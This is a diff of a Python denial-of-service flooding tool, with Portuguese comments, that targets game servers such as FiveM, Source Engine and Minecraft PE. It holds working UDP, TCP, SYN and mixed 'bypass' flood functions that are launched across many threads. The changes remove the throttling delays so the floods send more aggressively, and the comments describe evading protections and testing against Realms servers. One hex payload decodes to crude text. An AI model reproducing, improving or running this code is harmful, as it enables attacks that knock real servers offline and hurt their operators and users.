@@ -15,6 +15,11 @@ payload_fivem = b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
 payload_vse = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
 # Payload para MCPE (Minecraft PE)
 payload_mcpe = b'\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73'
+# Payload HEXadecimal
+payload_hex = b'\x55\x55\x55\x55\x00\x00\x00\x01'
+
+
+PACKET_SIZES = [512, 1024, 2048]
 
 
 base_user_agents = [
@@ -27,7 +32,6 @@ base_user_agents = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
 ]
-
 def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 
@@ -39,7 +43,7 @@ def attack_fivem(ip, port, secs):
 
 
 def attack_mcpe(ip, port, secs):
-    """Funciona muito bem em Realms Servers"""
+    """Testado em Realms Servers"""
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     while time.time() < secs:
         s.sendto(payload_mcpe, (ip, port))
@@ -53,43 +57,31 @@ def attack_vse(ip, port, secs):
 
 def attack_hex(ip, port, secs):
     s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes = random._urandom(1024)
-    payload = b'\x55\x55\x55\x55\x00\x00\x00\x01'
-    hex = payload + bytes
     while time.time() < secs:
-        s.sendto(hex, (ip, port))
+        s.sendto(payload_hex, (ip, port))
 
 
 def attack_udp_bypass(ip, port, secs):
-    PACKET_SIZES = [64, 128, 256, 512, 1024]
-    DELAY_RANGE = (0.05, 0.2)
-
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    
     while time.time() < secs:
-            packet_size = random.choice(PACKET_SIZES) 
-            packet = random._urandom(packet_size)
-            sock.sendto(packet, (ip, port))
-            delay = random.uniform(*DELAY_RANGE)
-            time.sleep(delay)
+        packet_size = random.choice(PACKET_SIZES) 
+        packet = random._urandom(packet_size)
+        sock.sendto(packet, (ip, port))
+
 
 
 def attack_tcp_bypass(ip, port, secs):
-    """Tenta contornar proteção adicionando delays."""
-    PACKET_SIZES = [64, 128, 256, 512, 1024]
-    packet_size = random.choice(PACKET_SIZES) 
+    """Tenta contornar proteção adicionando pacotes com tamanhos diferentes."""
+    
     while time.time() < secs:
+        packet_size = random.choice(PACKET_SIZES) 
         packet = random._urandom(packet_size)
-
-        DELAYS = (0.05, 0.5)
-        DELAY = random.uniform(*DELAYS)
 
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((ip, port))
             while time.time() < secs:
                 s.send(packet)
-                time.sleep(DELAY)  # Adiciona um atraso para evitar detecção rápida
         except Exception as e:
             pass
         finally:
@@ -97,15 +89,11 @@ def attack_tcp_bypass(ip, port, secs):
 
 
 def attack_tcp_udp_bypass(ip, port, secs):
-    """Tenta contornar proteção variando protocolo e adicionando delays."""
-    PACKET_SIZES = [64, 128, 256, 512, 1024]
-    DELAYS = (0.05, 0.5)
-    
+    """Tenta contornar proteção variando protocolo e adicionando pacotes com tamanhos diferentes."""
     while time.time() < secs:
         try:
             packet_size = random.choice(PACKET_SIZES)
             packet = random._urandom(packet_size)
-            delay = random.uniform(*DELAYS)
             
             if random.choice([True, False]):  # Alterna entre TCP e UDP
                 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -118,7 +106,6 @@ def attack_tcp_udp_bypass(ip, port, secs):
                     s.send(packet)
                 else:
                     s.sendto(packet, (ip, port))
-                time.sleep(delay)
         except Exception as e:
             pass
         finally:
@@ -127,8 +114,6 @@ def attack_tcp_udp_bypass(ip, port, secs):
 
 def attack_syn(ip, port, secs):
     """Melhorado para contornar proteções simples de SYN flood com variação de pacotes."""
-    PACKET_SIZES = [64, 128, 256, 512, 1024]
-    DELAYS = (0.01, 0.5)
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setblocking(0)
@@ -138,10 +123,8 @@ def attack_syn(ip, port, secs):
         while time.time() < secs:
             packet_size = random.choice(PACKET_SIZES)
             packet = os.urandom(packet_size)
-            delay = random.uniform(*DELAYS)
     
             s.send(packet)
-            time.sleep(delay)
     except Exception as e:
         pass
 
@@ -259,6 +242,7 @@ def main():
                 port = int(args[2])
                 secs = time.time() + int(args[3])
                 threads = int(args[4])
+                print(threads)
 
                 for _ in range(threads):
                     threading.Thread(target=lunch_attack, args=(method, ip, port, secs), daemon=True).start()
